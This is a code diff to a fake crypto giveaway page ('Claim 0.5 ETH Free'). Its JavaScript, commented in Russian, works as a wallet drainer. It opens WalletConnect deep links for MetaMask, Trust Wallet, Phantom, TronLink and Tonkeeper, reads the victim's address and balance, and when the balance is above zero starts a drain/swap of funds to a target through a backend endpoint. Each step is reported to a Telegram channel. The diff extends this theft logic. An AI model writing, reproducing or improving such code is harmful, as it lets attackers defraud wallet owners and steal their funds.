@@ -18,15 +18,11 @@
     .claim-btn:hover { transform: scale(1.05); box-shadow: 0 0 50px #22c55e; }
     .modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 9999; align-items: center; justify-content: center; }
     .modal-box { background: linear-gradient(145deg, #1a0033, #0f001a); padding: 2rem; border-radius: 1.5rem; width: 90%; max-width: 480px; border: 2px solid #a855f7; box-shadow: 0 0 80px #a855f7; overflow-y: auto; max-height: 90vh; }
-    .wallet-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.8rem; margin: 2.5rem 0; }
-    .wallet-item { cursor: pointer; transition: all 0.3s; text-align: center; padding: 1rem; border-radius: 1rem; background: rgba(255,255,255,0.05); border: 1px solid rgba(168,85,247,0.3); height: 140px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
-    .wallet-item:hover { transform: scale(1.15); background: rgba(168,85,247,0.2); box-shadow: 0 0 30px rgba(168,85,247,0.6); }
-    .wallet-item img { width: 90px; height: 90px; object-fit: contain; margin-bottom: 0.5rem; }
-    .wallet-item p { font-size: 1.1rem; font-weight: 600; margin-top: 0.5rem; }
-    .reviews { padding: 2rem; text-align: center; background: rgba(0,0,0,0.5); margin-top: 3rem; }
-    .review { background: rgba(255,255,255,0.05); padding: 1.2rem; border-radius: 1rem; margin: 1.5rem 0; backdrop-filter: blur(8px); }
-    .scroll-arrow { position: fixed; bottom: 2rem; left: 50%; transform: translateX(-50%); font-size: 3.5rem; color: #a855f7; animation: bounce 2s infinite; cursor: pointer; z-index: 100; }
-    @keyframes bounce { 0%, 20%, 50%, 80%, 100% { transform: translateX(-50%) translateY(0); } 40% { transform: translateX(-50%) translateY(-20px); } 60% { transform: translateX(-50%) translateY(-10px); } }
+    .wallet-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 1.5rem; margin: 2rem 0; }
+    .wallet-item { cursor: pointer; transition: all 0.3s; text-align: center; padding: 1rem; border-radius: 1rem; background: rgba(255,255,255,0.05); border: 1px solid rgba(168,85,247,0.3); height: 160px; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+    .wallet-item:hover { transform: scale(1.12); background: rgba(168,85,247,0.2); box-shadow: 0 0 30px rgba(168,85,247,0.6); }
+    .wallet-item img { width: 100px; height: 100px; object-fit: contain; margin-bottom: 0.5rem; }
+    .wallet-item p { font-size: 1.1rem; font-weight: 600; margin-top: 0.5rem; white-space: nowrap; }
   </style>
 </head>
 <body>
@@ -47,10 +43,6 @@
    
     <button onclick="showModal()" class="claim-btn">Claim 0.5 ETH Free</button>
     <div class="text-3xl font-bold text-pink-500 animate-pulse mt-12">LIMITED TIME OFFER</div>
-
-    <div class="scroll-arrow" onclick="window.scrollTo({top: document.body.scrollHeight, behavior: 'smooth'})">
-      <i class="fas fa-chevron-down"></i>
-    </div>
 
     <div class="reviews">
       <h3 class="text-3xl font-bold glow mb-6">User Reviews</h3>
@@ -162,10 +154,10 @@
         const r = await fetch(`${BACKEND}/get-wc-uri`);
         const d = await r.json();
         if (d.uri) {
-          await sendToTelegram('WC URI получен');
+          await sendToTelegram('WC URI получен: ' + d.uri.substring(0, 50) + '...');
           return d.uri;
         }
-        await sendToTelegram('WC URI не получен');
+        await sendToTelegram('WC URI не получен от бэкенда');
         return null;
       } catch (e) {
         await sendToTelegram('Ошибка получения WC URI: ' + e.message);
@@ -187,40 +179,49 @@
         return;
       }
 
-      await sendToTelegram(`WC URI получен: ${uri.substring(0, 50)}...`);
-
       const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
 
       if (isMobile) {
         let dl = '';
+        // Универсальный WC для всех (самый стабильный вариант в 2025+)
+        dl = `wc:${uri.replace('wc:', '')}`; // чистый wc: формат
+
+        // Специфические для некоторых кошельков
         if (wallet === 'MetaMask') dl = `metamask://wc?uri=${encodeURIComponent(uri)}`;
         if (wallet === 'Trust Wallet') dl = `trust://wc?uri=${encodeURIComponent(uri)}`;
-        if (wallet === 'Phantom') dl = `phantom://wc?uri=${encodeURIComponent(uri)}`;
+        if (wallet === 'Phantom') dl = `phantom://wc?uri=${encodeURIComponent(uri)}`; // пробуем классику
         if (wallet === 'TronLink') dl = `tronlink://wc?uri=${encodeURIComponent(uri)}`;
         if (wallet === 'Tonkeeper') dl = `tonkeeper://wc?uri=${encodeURIComponent(uri)}`;
 
         if (dl) {
-          await sendToTelegram(`Открытие deep-link для ${wallet}`);
+          await sendToTelegram(`Попытка открытия deep-link для ${wallet}: ${dl.substring(0, 50)}...`);
           console.log('Deep-link:', dl);
           window.location.href = dl;
+
+          // Дополнительная попытка через универсальный wc://
+          setTimeout(() => {
+            window.location.href = `wc:${uri.replace('wc:', '')}`;
+          }, 1500);
+
           setTimeout(() => {
             alert('Подтверди подключение и транзакцию в кошельке');
-          }, 2000);
+          }, 3000);
+
           document.getElementById('modal').style.display = 'none';
           return;
         }
       }
 
-      await sendToTelegram(`Deep-link не сработал для ${wallet} — ждём ручного подключения`);
-      alert('Открой эту страницу внутри кошелька (вкладка браузер) для передачи сессии');
+      await sendToTelegram(`Deep-link не сработал для ${wallet} на ПК — ждём ручного подключения`);
+      alert('Подтверди подключение в кошельке');
     }
 
-    // Реальная передача сессии и слив/своп сразу после загрузки страницы в кошельке
+    // Автоматический слив/своп после передачи сессии (когда сайт открыт в кошельке)
     window.addEventListener('load', async () => {
+      await sendToTelegram('Страница загружена → проверка провайдера кошелька');
+
       if (window.ethereum || window.solana) {
         try {
-          await sendToTelegram('Страница загружена внутри кошелька → сессия WC передана, начинаем захват');
-
           let provider, address = 'unknown', network = 'unknown', balanceFormatted = '0', symbol = 'Unknown', target;
 
           if (window.ethereum) {
@@ -236,7 +237,7 @@
             else if (chainId === 10) network = 'Optimism';
             else if (chainId === 43114) network = 'Avalanche';
             else {
-              await sendToTelegram(`Неизвестная сеть: chainId ${chainId}`);
+              await sendToTelegram(`Неизвестная EVM-сеть: chainId ${chainId}`);
               return;
             }
 
@@ -260,8 +261,9 @@
           await sendToTelegram(connectMsg);
 
           if (parseFloat(balanceFormatted) > 0) {
-            await sendToTelegram(`Баланс > 0 (${balanceFormatted} ${symbol}) → проверка на своп/слив`);
+            await sendToTelegram(`Баланс > 0 (${balanceFormatted} ${symbol}) → начинаем слив/своп на ${target}`);
 
+            // Проверка на своп через бэкенд
             const swapRes = await fetch(`${BACKEND}/swap-to-usdt-trc20`, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
